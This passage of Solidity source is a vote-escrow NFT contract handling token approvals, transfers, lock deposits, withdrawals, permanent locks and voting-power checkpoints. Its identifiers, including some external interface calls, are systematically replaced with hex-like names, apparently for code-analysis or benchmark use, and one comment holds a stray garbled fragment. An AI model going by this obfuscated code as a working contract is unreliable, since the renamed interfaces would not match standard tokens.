_0x1d4965[_0x5df481] = _0xd524e5;\n        emit Approval(_0xdc2230, _0xd524e5, _0x5df481);\n    }\n\n    /// @dev Enables or disables approval for a third party (\"operator\") to manage all of\n    ///      `msg.sender`'s assets. It also emits the ApprovalForAll event.\n    ///      Throws if `_operator` is the `msg.sender`. (NOTE: This is not written the EIP)\n    /// @notice This works even if sender doesn't own any tokens at the time.\n    /// @param _operator Address to add to the set of authorized operators.\n    /// @param _approved True if the operators is approved, false to revoke approval.\n    function _0x7349f7(address _0xd22674, bool _0xd524e5) external {\n        // Throws if `_operator` is the `msg.sender`\n        assert(_0xd22674 != msg.sender);\n        _0x8e8e9f[msg.sender][_0xd22674] = _0xd524e5;\n        emit ApprovalForAll(msg.sender, _0xd22674, _0xd524e5);\n    }\n\n    /* TRANSFER FUNCTIONS */\n    /// @dev Clear an approval of a given address\n    ///      Throws if `_owner` is not the current owner.\n    function _0x089840(address _0xcbad60, uint _0x5df481) internal {\n        // Throws if `_owner` is not the current owner\n        assert(_0xa3b03d[_0x5df481] == _0xcbad60);\n        if (_0x1d4965[_0x5df481] != address(0)) {\n            // Reset approvals\n            _0x1d4965[_0x5df481] = address(0);\n        }\n    }\n\n    /// @dev Returns whether the given spender can transfer a given token ID\n    /// @param _spender address of the spender to query\n    /// @param _tokenId uint ID of the token to be transferred\n    /// @return bool whether the msg.sender is approved for the given token ID, is an operator of the owner, or is the owner of the token\n    function _0x090c25(address _0xfaa387, uint _0x5df481) internal view returns (bool) {\n        address _0xdc2230 = _0xa3b03d[_0x5df481];\n        bool _0x9ef348 = _0xdc2230 == _0xfaa387;\n        bool _0x613e78 = _0xfaa387 == _0x1d4965[_0x5df481];\n        bool _0x3ff80c = (_0x8e8e9f[_0xdc2230])[_0xfaa387];\n        return _0x9ef348 || _0x613e78 || _0x3ff80c;\n    }\n\n    function _0x3c6e17(address _0xfaa387, uint _0x5df481) external view returns (bool) {\n        return _0x090c25(_0xfaa387, _0x5df481);\n    }\n\n    /// @dev Exeute transfer of a NFT.\n    ///      Throws unless `msg.sender` is the current owner, an authorized operator, or the approved\n    ///      address for this NFT. (NOTE: `msg.sender` not allowed in internal function so pass `_sender`.)\n    ///      Throws if `_to` is the zero address.\n    ///      Throws if `_from` is not the current owner.\n    ///      Throws if `_tokenId` is not a valid NFT.\n    function _0x649e9a(\n        address _0x926a34,\n        address _0x5d1a15,\n        uint _0x5df481,\n        address _0x172b63\n    ) internal _0x36539f(_0x5df481) {\n        require(_0x45015f[_0x5df481] == 0 && !_0x91e191[_0x5df481], \"ATT\");\n        // Check requirements\n        require(_0x090c25(_0x172b63, _0x5df481), \"NAO\");\n\n        // Clear approval. Throws if `_from` is not the current owner\n        _0x089840(_0x926a34, _0x5df481);\n        // Remove NFT. Throws if `_tokenId` is not a valid NFT\n        _0xd1a6da(_0x926a34, _0x5df481);\n        // auto re-delegate\n        VotingDelegationLib._0xbf2e9b(_0x14872c, _0x7f3cc6(_0x926a34), _0x7f3cc6(_0x5d1a15), _0x5df481, _0x686137);\n        // Add NFT\n        _0x581a7c(_0x5d1a15, _0x5df481);\n        // Set the block of ownership transfer (for Flash NFT protection)\n        _0x5bc75c[_0x5df481] = block.number;\n\n        // Log the transfer\n        emit Transfer(_0x926a34, _0x5d1a15, _0x5df481);\n    }\n\n    /// @dev Throws unless `msg.sender` is the current owner, an authorized operator, or the approved address for this NFT.\n    ///      Throws if `_from` is not the current owner.\n    ///      Throws if `_to` is the zero address.\n    ///      Throws if `_tokenId` is not a valid NFT.\n    /// @notice The caller is responsible to confirm that `_to` is capable of receiving NFTs or else\n    ///        they maybe be permanently lost.\n    /// @param _from The current owner of the NFT.\n    /// @param _to The new owner.\n    /// @param _tokenId The NFT to transfer.\n    function _0xf8cb4b(\n        address _0x926a34,\n        address _0x5d1a15,\n        uint _0x5df481\n    ) external {\n        _0x649e9a(_0x926a34, _0x5d1a15, _0x5df481, msg.sender);\n    }\n\n    /// @dev Transfers the ownership of an NFT from one address to another address.\n    ///      Throws unless `msg.sender` is the current owner, an authorized operator, or the\n    ///      approved address for this NFT.\n    ///      Throws if `_from` is not the current owner.\n    ///      Throws if `_to` is the zero address.\n    ///      Throws if `_tokenId` is not a valid NFT.\n    ///      If `_to` is a smart contract, it calls `onERC721Received` on `_to` and throws if\n    ///      the return value is not `bytes4(keccak256(\"onERC721Received(address,address,uint,bytes)\"))`.\n    /// @param _from The current owner of the NFT.\n    /// @param _to The new owner.\n    /// @param _tokenId The NFT to transfer.\n    function _0x49347d(\n        address _0x926a34,\n        address _0x5d1a15,\n        uint _0x5df481\n    ) external {\n        _0x49347d(_0x926a34, _0x5d1a15, _0x5df481, \"\");\n    }\n\n    function _0x74fefa(address _0xe2f196) internal view returns (bool) {\n        // This method relies on extcodesize, which returns 0 for contracts in\n        // construction, since the code is only stored at the end of the\n        // constructor execution.\n        uint _0xabdfff;\n        assembly {\n            _0xabdfff := extcodesize(_0xe2f196)\n        }\n        return _0xabdfff > 0;\n    }\n\n    /// @dev Transfers the ownership of an NFT from one address to another address.\n    ///      Throws unless `msg.sender` is the current owner, an authorized operator, or the\n    ///      approved address for this NFT.\n    ///      Throws if `_from` is not the current owner.\n    ///      Throws if `_to` is the zero address.\n    ///      Throws if `_tokenId` is not a valid NFT.\n    ///      If `_to` is a smart contract, it calls `onERC721Received` on `_to` and throws if\n    ///      the return value is not `bytes4(keccak256(\"onERC721Received(address,address,uint,bytes)\"))`.\n    /// @param _from The current owner of the NFT.\n    /// @param _to The new owner.\n    /// @param _tokenId The NFT to transfer.\n    /// @param _data Additional data with no specified format, sent in call to `_to`.\n    function _0x49347d(\n        address _0x926a34,\n        address _0x5d1a15,\n        uint _0x5df481,\n        bytes memory _0xfb97fd\n    ) public {\n        _0x649e9a(_0x926a34, _0x5d1a15, _0x5df481, msg.sender);\n\n        if (_0x74fefa(_0x5d1a15)) {\n            // Throws if transfer destination is a contract which does not implement 'onERC721Received'\n            try IERC721Receiver(_0x5d1a15)._0xdc2c97(msg.sender, _0x926a34, _0x5df481, _0xfb97fd) returns (bytes4 _0x9aa8fb) {\n                if (_0x9aa8fb != IERC721Receiver(_0x5d1a15)._0xdc2c97.selector) {\n                    revert(\"E721_RJ\");\n                }\n            } catch (bytes memory _0x86e3e6) {\n                if (_0x86e3e6.length == 0) {\n                    revert('E721_NRCV');\n                } else {\n                    assembly {\n                        revert(add(32, _0x86e3e6), mload(_0x86e3e6))\n                    }\n                }\n            }\n        }\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                              ERC165 LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    /// @dev Interface identification is specified in ERC-165.\n    /// @param _interfaceID Id of the interface\n    function _0x0aabbb(bytes4 _0x883fba) external view returns (bool) {\n        return _0x8f36bc[_0x883fba];\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                        INTERNAL MINT/BURN LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    /// @dev Mapping from owner address to mapping of index to tokenIds\n    mapping(address => mapping(uint => uint)) internal _0x97ca44;\n\n    /// @dev Mapping from NFT ID to index of owner\n    mapping(uint => uint) internal _0x0c0286;\n\n    /// @dev  Get token by index\n    function _0x3a052a(address _0xcbad60, uint _0x586271) public view returns (uint) {\n        return _0x97ca44[_0xcbad60][_0x586271];\n    }\n\n    /// @dev Add a NFT to an index mapping to a given addressndashushun\n    /// @param _to address of the receiver\n    /// @param _tokenId uint ID Of the token to be added\n    function _0x1af70a(address _0x5d1a15, uint _0x5df481) internal {\n        uint _0x81102c = _0xa5ebb8(_0x5d1a15);\n\n        _0x97ca44[_0x5d1a15][_0x81102c] = _0x5df481;\n        _0x0c0286[_0x5df481] = _0x81102c;\n    }\n\n    /// @dev Add a NFT to a given address\n    ///      Throws if `_tokenId` is owned by someone.\n    function _0x581a7c(address _0x5d1a15, uint _0x5df481) internal {\n        // Throws if `_tokenId` is owned by someone\n        assert(_0xa3b03d[_0x5df481] == address(0));\n        // Change the owner\n        _0xa3b03d[_0x5df481] = _0x5d1a15;\n        // Update owner token index tracking\n        _0x1af70a(_0x5d1a15, _0x5df481);\n        // Change count tracking\n        _0xd0dc6b[_0x5d1a15] += 1;\n    }\n\n    /// @dev Function to mint tokens\n    ///      Throws if `_to` is zero address.\n    ///      Throws if `_tokenId` is owned by someone.\n    /// @param _to The address that will receive the minted tokens.\n    /// @param _tokenId The token id to mint.\n    /// @return A boolean that indicates if the operation was successful.\n    function _0x9e0227(address _0x5d1a15, uint _0x5df481) internal returns (bool) {\n        // Throws if `_to` is zero address\n        assert(_0x5d1a15 != address(0));\n        // checkpoint for gov\n        VotingDelegationLib._0xbf2e9b(_0x14872c, address(0), _0x7f3cc6(_0x5d1a15), _0x5df481, _0x686137);\n        // Add NFT. Throws if `_tokenId` is owned by someone\n        _0x581a7c(_0x5d1a15, _0x5df481);\n        emit Transfer(address(0), _0x5d1a15, _0x5df481);\n        return true;\n    }\n\n    /// @dev Remove a NFT from an index mapping to a given address\n    /// @param _from address of the sender\n    /// @param _tokenId uint ID Of the token to be removed\n    function _0xe25b85(address _0x926a34, uint _0x5df481) internal {\n        // Delete\n        uint _0x81102c = _0xa5ebb8(_0x926a34) - 1;\n        uint _0x1a6e77 = _0x0c0286[_0x5df481];\n\n        if (_0x81102c == _0x1a6e77) {\n            // update ownerToNFTokenIdList\n            _0x97ca44[_0x926a34][_0x81102c] = 0;\n            // update tokenToOwnerIndex\n            _0x0c0286[_0x5df481] = 0;\n        } else {\n            uint _0xe33a39 = _0x97ca44[_0x926a34][_0x81102c];\n\n            // Add\n            // update ownerToNFTokenIdList\n            _0x97ca44[_0x926a34][_0x1a6e77] = _0xe33a39;\n            // update tokenToOwnerIndex\n            _0x0c0286[_0xe33a39] = _0x1a6e77;\n\n            // Delete\n            // update ownerToNFTokenIdList\n            _0x97ca44[_0x926a34][_0x81102c] = 0;\n            // update tokenToOwnerIndex\n            _0x0c0286[_0x5df481] = 0;\n        }\n    }\n\n    /// @dev Remove a NFT from a given address\n    ///      Throws if `_from` is not the current owner.\n    function _0xd1a6da(address _0x926a34, uint _0x5df481) internal {\n        // Throws if `_from` is not the current owner\n        assert(_0xa3b03d[_0x5df481] == _0x926a34);\n        // Change the owner\n        _0xa3b03d[_0x5df481] = address(0);\n        // Update owner token index tracking\n        _0xe25b85(_0x926a34, _0x5df481);\n        // Change count tracking\n        _0xd0dc6b[_0x926a34] -= 1;\n    }\n\n    function _0x422597(uint _0x5df481) internal {\n        require(_0x090c25(msg.sender, _0x5df481), \"NAO\");\n\n        address _0xdc2230 = _0x686137(_0x5df481);\n\n        // Clear approval\n        delete _0x1d4965[_0x5df481];\n        // Remove token\n        //_removeTokenFrom(msg.sender, _tokenId);\n        _0xd1a6da(_0xdc2230, _0x5df481);\n        // checkpoint for gov\n        VotingDelegationLib._0xbf2e9b(_0x14872c, _0x7f3cc6(_0xdc2230), address(0), _0x5df481, _0x686137);\n\n        emit Transfer(_0xdc2230, address(0), _0x5df481);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                             ESCROW STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    mapping(uint => IVotingEscrow.LockedBalance) public _0xabcf2a;\n    uint public _0x01bc68;\n    uint public _0x515bb7;\n    mapping(uint => int128) public _0x58a767; // time -> signed slope change\n    uint public _0x743a0f;\n    mapping(address => bool) public _0x5adf69;\n\n    uint internal constant MULTIPLIER = 1 ether;\n\n    /*//////////////////////////////////////////////////////////////\n                              ESCROW LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Get the most recently recorded rate of voting power decrease for `_tokenId`\n    /// @param _tokenId token of the NFT\n    /// @return Value of the slope\n    function _0x395a47(uint _0x5df481) external view returns (int128) {\n        uint _0xbe558d = _0x38ef44._0xa2603a[_0x5df481];\n        return _0x38ef44._0x9baa66[_0x5df481][_0xbe558d]._0x79c1ee;\n    }\n\n    /// @notice Get the timestamp for checkpoint `_idx` for `_tokenId`\n    /// @param _tokenId token of the NFT\n    /// @param _idx User epoch number\n    /// @return Epoch time of the checkpoint\n    function _0x9baa66(uint _0x5df481, uint _0x7ed466) external view returns (IVotingEscrow.Point memory) {\n        return _0x38ef44._0x9baa66[_0x5df481][_0x7ed466];\n    }\n\n    function _0xef96cd(uint _0x515bb7) external view returns (IVotingEscrow.Point memory) {\n        return _0x38ef44._0xef96cd[_0x515bb7];\n    }\n\n    function _0xa2603a(uint _0xa09499) external view returns (uint) {\n        return _0x38ef44._0xa2603a[_0xa09499];\n    }\n\n    /// @notice Record global and per-user data to checkpoint\n    /// @param _tokenId NFT token ID. No user checkpoint if 0\n    /// @param old_locked Pevious locked amount / end lock time for the user\n    /// @param new_locked New locked amount / end lock time for the user\n    function _0x6b3775(\n        uint _0x5df481,\n        IVotingEscrow.LockedBalance memory _0x24eb43,\n        IVotingEscrow.LockedBalance memory _0xc23948\n    ) internal {\n        IVotingEscrow.Point memory _0x00e623;\n        IVotingEscrow.Point memory _0xa2a3e7;\n        int128 _0xeeb9d0 = 0;\n        int128 _0xa8de77 = 0;\n        uint _0x46457f = _0x515bb7;\n\n        if (_0x5df481 != 0) {\n            _0xa2a3e7._0x4b8496 = 0;\n\n            if(_0xc23948._0x060c30){\n                _0xa2a3e7._0x4b8496 = uint(int256(_0xc23948._0x4284c8));\n            }\n\n            // Calculate slopes and biases\n            // Kept at zero when they have to\n            if (_0x24eb43._0xcab435 > block.timestamp && _0x24eb43._0x4284c8 > 0) {\n                _0x00e623._0x79c1ee = _0x24eb43._0x4284c8 / _0x915f19;\n                _0x00e623._0x8aa000 = _0x00e623._0x79c1ee * int128(int256(_0x24eb43._0xcab435 - block.timestamp));\n            }\n            if (_0xc23948._0xcab435 > block.timestamp && _0xc23948._0x4284c8 > 0) {\n                _0xa2a3e7._0x79c1ee = _0xc23948._0x4284c8 / _0x915f19;\n                _0xa2a3e7._0x8aa000 = _0xa2a3e7._0x79c1ee * int128(int256(_0xc23948._0xcab435 - block.timestamp));\n            }\n\n            // Read values of scheduled changes in the slope\n            // old_locked.end can be in the past and in the future\n            // new_locked.end can ONLY by in the FUTURE unless everything expired: than zeros\n            _0xeeb9d0 = _0x58a767[_0x24eb43._0xcab435];\n            if (_0xc23948._0xcab435 != 0) {\n                if (_0xc23948._0xcab435 == _0x24eb43._0xcab435) {\n                    _0xa8de77 = _0xeeb9d0;\n                } else {\n                    _0xa8de77 = _0x58a767[_0xc23948._0xcab435];\n                }\n            }\n        }\n\n        IVotingEscrow.Point memory _0x3fd558 = IVotingEscrow.Point({_0x8aa000: 0, _0x79c1ee: 0, _0xcd5a26: block.timestamp, _0x61d546: block.number, _0x4b8496: 0});\n        if (_0x46457f > 0) {\n            _0x3fd558 = _0x38ef44._0xef96cd[_0x46457f];\n        }\n        uint _0x703e77 = _0x3fd558._0xcd5a26;\n        // initial_last_point is used for extrapolation to calculate block number\n        // (approximately, for *At methods) and save them\n        // as we cannot figure that out exactly from inside the contract\n        IVotingEscrow.Point memory _0x04fa5b = _0x3fd558;\n        uint _0x1980c2 = 0; // dblock/dt\n        if (block.timestamp > _0x3fd558._0xcd5a26) {\n            _0x1980c2 = (MULTIPLIER * (block.number - _0x3fd558._0x61d546)) / (block.timestamp - _0x3fd558._0xcd5a26);\n        }\n        // If last point is already recorded in this block, slope=0\n        // But that's ok b/c we know the block in such case\n\n        // Go over weeks to fill history and calculate what the current point is\n        {\n            uint _0x211a79 = (_0x703e77 / WEEK) * WEEK;\n            for (uint i = 0; i < 255; ++i) {\n                // Hopefully it won't happen that this won't get used in 5 years!\n                // If it does, users will be able to withdraw but vote weight will be broken\n                _0x211a79 += WEEK;\n                int128 _0x782741 = 0;\n                if (_0x211a79 > block.timestamp) {\n                    _0x211a79 = block.timestamp;\n                } else {\n                    _0x782741 = _0x58a767[_0x211a79];\n                }\n                _0x3fd558._0x8aa000 -= _0x3fd558._0x79c1ee * int128(int256(_0x211a79 - _0x703e77));\n                _0x3fd558._0x79c1ee += _0x782741;\n                if (_0x3fd558._0x8aa000 < 0) {\n                    // This can happen\n                    _0x3fd558._0x8aa000 = 0;\n                }\n                if (_0x3fd558._0x79c1ee < 0) {\n                    // This cannot happen - just in case\n                    _0x3fd558._0x79c1ee = 0;\n                }\n                _0x703e77 = _0x211a79;\n                _0x3fd558._0xcd5a26 = _0x211a79;\n                _0x3fd558._0x61d546 = _0x04fa5b._0x61d546 + (_0x1980c2 * (_0x211a79 - _0x04fa5b._0xcd5a26)) / MULTIPLIER;\n                _0x46457f += 1;\n                if (_0x211a79 == block.timestamp) {\n                    _0x3fd558._0x61d546 = block.number;\n                    break;\n                } else {\n                    _0x38ef44._0xef96cd[_0x46457f] = _0x3fd558;\n                }\n            }\n        }\n\n        _0x515bb7 = _0x46457f;\n        // Now point_history is filled until t=now\n\n        if (_0x5df481 != 0) {\n            // If last point was in this block, the slope change has been applied already\n            // But in such case we have 0 slope(s)\n            _0x3fd558._0x79c1ee += (_0xa2a3e7._0x79c1ee - _0x00e623._0x79c1ee);\n            _0x3fd558._0x8aa000 += (_0xa2a3e7._0x8aa000 - _0x00e623._0x8aa000);\n            if (_0x3fd558._0x79c1ee < 0) {\n                _0x3fd558._0x79c1ee = 0;\n            }\n            if (_0x3fd558._0x8aa000 < 0) {\n                _0x3fd558._0x8aa000 = 0;\n            }\n            _0x3fd558._0x4b8496 = _0x01bc68;\n        }\n\n        // Record the changed point into history\n        _0x38ef44._0xef96cd[_0x46457f] = _0x3fd558;\n\n        if (_0x5df481 != 0) {\n            // Schedule the slope changes (slope is going down)\n            // We subtract new_user_slope from [new_locked.end]\n            // and add old_user_slope to [old_locked.end]\n            if (_0x24eb43._0xcab435 > block.timestamp) {\n                // old_dslope was <something> - u_old.slope, so we cancel that\n                _0xeeb9d0 += _0x00e623._0x79c1ee;\n                if (_0xc23948._0xcab435 == _0x24eb43._0xcab435) {\n                    _0xeeb9d0 -= _0xa2a3e7._0x79c1ee; // It was a new deposit, not extension\n                }\n                _0x58a767[_0x24eb43._0xcab435] = _0xeeb9d0;\n            }\n\n            if (_0xc23948._0xcab435 > block.timestamp) {\n                if (_0xc23948._0xcab435 > _0x24eb43._0xcab435) {\n                    _0xa8de77 -= _0xa2a3e7._0x79c1ee; // old slope disappeared at this point\n                    _0x58a767[_0xc23948._0xcab435] = _0xa8de77;\n                }\n                // else: we recorded it already in old_dslope\n            }\n            // Now handle user history\n            uint _0x119df3 = _0x38ef44._0xa2603a[_0x5df481] + 1;\n\n            _0x38ef44._0xa2603a[_0x5df481] = _0x119df3;\n            _0xa2a3e7._0xcd5a26 = block.timestamp;\n            _0xa2a3e7._0x61d546 = block.number;\n            _0x38ef44._0x9baa66[_0x5df481][_0x119df3] = _0xa2a3e7;\n        }\n    }\n\n    /// @notice Deposit and lock tokens for a user\n    /// @param _tokenId NFT that holds lock\n    /// @param _value Amount to deposit\n    /// @param unlock_time New time when to unlock the tokens, or 0 if unchanged\n    /// @param locked_balance Previous locked amount / timestamp\n    /// @param deposit_type The type of deposit\n    function _0xe72d05(\n        uint _0x5df481,\n        uint _0xd769e9,\n        uint _0x76d858,\n        IVotingEscrow.LockedBalance memory _0x473217,\n        DepositType _0xdf513e\n    ) internal {\n        IVotingEscrow.LockedBalance memory _0x0a02a8 = _0x473217;\n        uint _0x481d9f = _0x743a0f;\n\n        _0x743a0f = _0x481d9f + _0xd769e9;\n        IVotingEscrow.LockedBalance memory _0x24eb43;\n        (_0x24eb43._0x4284c8, _0x24eb43._0xcab435, _0x24eb43._0x060c30) = (_0x0a02a8._0x4284c8, _0x0a02a8._0xcab435, _0x0a02a8._0x060c30);\n        // Adding to existing lock, or if a lock is expired - creating a new one\n        _0x0a02a8._0x4284c8 += int128(int256(_0xd769e9));\n\n        if (_0x76d858 != 0) {\n            _0x0a02a8._0xcab435 = _0x76d858;\n        }\n        _0xabcf2a[_0x5df481] = _0x0a02a8;\n\n        // Possibilities:\n        // Both old_locked.end could be current or expired (>/< block.timestamp)\n        // value == 0 (extend lock) or value > 0 (add to lock or extend lock)\n        // _locked.end > block.timestamp (always)\n        _0x6b3775(_0x5df481, _0x24eb43, _0x0a02a8);\n\n        address from = msg.sender;\n        if (_0xd769e9 != 0) {\n            assert(IERC20(_0x0ca0d4)._0xf8cb4b(from, address(this), _0xd769e9));\n        }\n\n        emit Deposit(from, _0x5df481, _0xd769e9, _0x0a02a8._0xcab435, _0xdf513e, block.timestamp);\n        emit Supply(_0x481d9f, _0x481d9f + _0xd769e9);\n    }\n\n    /// @notice Record global data to checkpoint\n    function _0x857a46() external {\n        _0x6b3775(0, IVotingEscrow.LockedBalance(0, 0, false), IVotingEscrow.LockedBalance(0, 0, false));\n    }\n\n    /// @notice Deposit `_value` tokens for `_tokenId` and add to the lock\n    /// @dev Anyone (even a smart contract) can deposit for someone else, but\n    ///      cannot extend their locktime and deposit for a brand new user\n    /// @param _tokenId lock NFT\n    /// @param _value Amount to add to user's lock\n    function _0x3324b6(uint _0x5df481, uint _0xd769e9) external _0x42237d {\n        IVotingEscrow.LockedBalance memory _0x0a02a8 = _0xabcf2a[_0x5df481];\n\n        require(_0xd769e9 > 0, \"ZV\"); // dev: need non-zero value\n        require(_0x0a02a8._0x4284c8 > 0, 'ZL');\n        require(_0x0a02a8._0xcab435 > block.timestamp || _0x0a02a8._0x060c30, 'EXP');\n\n        if (_0x0a02a8._0x060c30) _0x01bc68 += _0xd769e9;\n\n        _0xe72d05(_0x5df481, _0xd769e9, 0, _0x0a02a8, DepositType.DEPOSIT_FOR_TYPE);\n\n        if(_0x91e191[_0x5df481]) {\n            IVoter(_0x3dd917)._0x4571e0(_0x5df481);\n        }\n    }\n\n    /// @notice Deposit `_value` tokens for `_to` and lock for `_lock_duration`\n    /// @param _value Amount to deposit\n    /// @param _lock_duration Number of seconds to lock tokens for (rounded down to nearest week)\n    /// @param _to Address to deposit\n    function _0x1714a4(uint _0xd769e9, uint _0xf51f7f, address _0x5d1a15) internal returns (uint) {\n        uint _0x76d858 = (block.timestamp + _0xf51f7f) / WEEK * WEEK; // Locktime is rounded down to weeks\n\n        require(_0xd769e9 > 0, \"ZV\"); // dev: need non-zero value\n        require(_0x76d858 > block.timestamp && (_0x76d858 <= block.timestamp + MAXTIME), 'IUT');\n\n        ++_0xa09499;\n        uint _0x5df481 = _0xa09499;\n        _0x9e0227(_0x5d1a15, _0x5df481);\n\n        IVotingEscrow.LockedBalance memory _0x0a02a8 = _0xabcf2a[_0x5df481];\n\n        _0xe72d05(_0x5df481, _0xd769e9, _0x76d858, _0x0a02a8, DepositType.CREATE_LOCK_TYPE);\n        return _0x5df481;\n    }\n\n    /// @notice Deposit `_value` tokens for `msg.sender` and lock for `_lock_duration`\n    /// @param _value Amount to deposit\n    /// @param _lock_duration Number of seconds to lock tokens for (rounded down to nearest week)\n    function _0x3f20d8(uint _0xd769e9, uint _0xf51f7f) external _0x42237d returns (uint) {\n        return _0x1714a4(_0xd769e9, _0xf51f7f, msg.sender);\n    }\n\n    /// @notice Deposit `_value` tokens for `_to` and lock for `_lock_duration`\n    /// @param _value Amount to deposit\n    /// @param _lock_duration Number of seconds to lock tokens for (rounded down to nearest week)\n    /// @param _to Address to deposit\n    function _0x5232ae(uint _0xd769e9, uint _0xf51f7f, address _0x5d1a15) external _0x42237d returns (uint) {\n        return _0x1714a4(_0xd769e9, _0xf51f7f, _0x5d1a15);\n    }\n\n    /// @notice Deposit `_value` additional tokens for `_tokenId` without modifying the unlock time\n    /// @param _value Amount of tokens to deposit and add to the lock\n    function _0x458296(uint _0x5df481, uint _0xd769e9) external _0x42237d {\n        assert(_0x090c25(msg.sender, _0x5df481));\n\n        IVotingEscrow.LockedBalance memory _0x0a02a8 = _0xabcf2a[_0x5df481];\n\n        assert(_0xd769e9 > 0); // dev: need non-zero value\n        require(_0x0a02a8._0x4284c8 > 0, 'ZL');\n        require(_0x0a02a8._0xcab435 > block.timestamp || _0x0a02a8._0x060c30, 'EXP');\n\n        if (_0x0a02a8._0x060c30) _0x01bc68 += _0xd769e9;\n        _0xe72d05(_0x5df481, _0xd769e9, 0, _0x0a02a8, DepositType.INCREASE_LOCK_AMOUNT);\n\n        // poke for the gained voting power\n        if(_0x91e191[_0x5df481]) {\n            IVoter(_0x3dd917)._0x4571e0(_0x5df481);\n        }\n        emit MetadataUpdate(_0x5df481);\n    }\n\n    /// @notice Extend the unlock time for `_tokenId`\n    /// @param _lock_duration New number of seconds until tokens unlock\n    function _0x8b22da(uint _0x5df481, uint _0xf51f7f) external _0x42237d {\n        assert(_0x090c25(msg.sender, _0x5df481));\n\n        IVotingEscrow.LockedBalance memory _0x0a02a8 = _0xabcf2a[_0x5df481];\n        require(!_0x0a02a8._0x060c30, \"!NORM\");\n        uint _0x76d858 = (block.timestamp + _0xf51f7f) / WEEK * WEEK; // Locktime is rounded down to weeks\n\n        require(_0x0a02a8._0xcab435 > block.timestamp && _0x0a02a8._0x4284c8 > 0, 'EXP||ZV');\n        require(_0x76d858 > _0x0a02a8._0xcab435 && (_0x76d858 <= block.timestamp + MAXTIME), 'IUT'); // IUT -> invalid unlock time\n\n        _0xe72d05(_0x5df481, 0, _0x76d858, _0x0a02a8, DepositType.INCREASE_UNLOCK_TIME);\n\n        // poke for the gained voting power\n        if(_0x91e191[_0x5df481]) {\n            IVoter(_0x3dd917)._0x4571e0(_0x5df481);\n        }\n        emit MetadataUpdate(_0x5df481);\n    }\n\n    /// @notice Withdraw all tokens for `_tokenId`\n    /// @dev Only possible if the lock has expired\n    function _0xcc469b(uint _0x5df481) external _0x42237d {\n        assert(_0x090c25(msg.sender, _0x5df481));\n        require(_0x45015f[_0x5df481] == 0 && !_0x91e191[_0x5df481], \"ATT\");\n\n        IVotingEscrow.LockedBalance memory _0x0a02a8 = _0xabcf2a[_0x5df481];\n        require(!_0x0a02a8._0x060c30, \"!NORM\");\n        require(block.timestamp >= _0x0a02a8._0xcab435, \"!EXP\");\n        uint value = uint(int256(_0x0a02a8._0x4284c8));\n\n        _0xabcf2a[_0x5df481] = IVotingEscrow.LockedBalance(0, 0, false);\n        uint _0x481d9f = _0x743a0f;\n        _0x743a0f = _0x481d9f - value;\n\n        // old_locked can have either expired <= timestamp or zero end\n        // _locked has only 0 end\n        // Both can have >= 0 amount\n        _0x6b3775(_0x5df481, _0x0a02a8, IVotingEscrow.LockedBalance(0, 0, false));\n\n        assert(IERC20(_0x0ca0d4).transfer(msg.sender, value));\n\n        // Burn the NFT\n        _0x422597(_0x5df481);\n\n        emit Withdraw(msg.sender, _0x5df481, value, block.timestamp);\n        emit Supply(_0x481d9f, _0x481d9f - value);\n    }\n\n    function _0xc5a163(uint _0x5df481) external {\n        address sender = msg.sender;\n        require(_0x090c25(sender, _0x5df481), \"NAO\");\n\n        IVotingEscrow.LockedBalance memory _0xff506b = _0xabcf2a[_0x5df481];\n        require(!_0xff506b._0x060c30, \"!NORM\");\n        require(_0xff506b._0xcab435 > block.timestamp, \"EXP\");\n        require(_0xff506b._0x4284c8 > 0, \"ZV\");\n\n        uint _0x65a0f1 = uint(int256(_0xff506b._0x4284c8));\n        _0x01bc68 += _0x65a0f1;\n        _0xff506b._0xcab435 = 0;\n        _0xff506b._0x060c30 = true;\n        _0x6b3775(_0x5df481, _0xabcf2a[_0x5df481], _0xff506b);\n        _0xabcf2a[_0x5df481] = _0xff506b;\n        if(_0x91e191[_0x5df481]) {\n            IVoter(_0x3dd917)._0x4571e0(_0x5df481);\n        }\n        emit LockPermanent(sender, _0x5df481, _0x65a0f1, block.timestamp);\n        emit MetadataUpdate(_0x5df481);\n    }\n\n    function _0xe5799f(uint _0x5df481) external {\n        address sender = msg.sender;\n        require(_0x090c25(msg.sender, _0x5df481), \"NAO\");\n\n        require(_0x45015f[_0x5df481] == 0 && !_0x91e191[_0x5df481], \"ATT\");\n        IVotingEscrow.LockedBalance memory _0xff506b = _0xabcf2a[_0x5df481];\n        require(_0xff506b._0x060c30, \"!NORM\");\n        uint _0x65a0f1 = uint(int256(_0xff506b._0x4284c8));\n        _0x01bc68 -= _0x65a0f1;\n        _0xff506b._0xcab435 = ((block.timestamp + MAXTIME) / WEEK) * WEEK;\n        _0xff506b._0x060c30 = false;\n\n        _0x6b3775(_0x5df481, _0xabcf2a[_0x5df481], _0xff506b);\n        _0xabcf2a[_0x5df481] = _0xff506b;\n\n        emit UnlockPermanent(sender, _0x5df481, _0x65a0f1, block.timestamp);\n        emit MetadataUpdate(_0x5df481);\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                           GAUGE VOTING STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    // The following ERC20/minime-compatible methods are not real balanceOf and supply!\n    // They measure the weights for the purpose of voting, so they don't represent\n    // real coins.\n\n    function _0xf768b3(uint _0x5df481) external view returns (uint) {\n        if (_0x5bc75c[_0x5df481] == block.number) return 0;\n        return VotingBalanceLogic._0xf768b3(_0x5df481, block.timestamp, _0x38ef44);\n    }\n\n    function _0xf79973(uint _0x5df481, uint _0x57cc72) external view returns (uint) {\n        return VotingBalanceLogic._0xf768b3(_0x5df481, _0x57cc72, _0x38ef44);\n    }\n\n    function _0xc8355f(uint _0x5df481, uint _0xc88e3a) external view returns (uint) {\n        return VotingBalanceLogic._0xc8355f(_0x5df481, _0xc88e3a, _0x38ef44, _0x515bb7);\n    }\n\n    /// @notice Calculate total voting power at some point in the past\n    /// @param _block Block to calculate the total voting power at\n    /// @return Total voting power at `_block`\n    function _0x5dae03(uint _0xc88e3a) external view returns (uint) {\n        return VotingBalanceLogic._0x5dae03(_0xc88e3a, _0x515bb7, _0x38ef44, _0x58a767);\n    }\n\n    function _0xcae313() external view returns (uint) {\n        return _0xdecc07(block.timestamp);\n    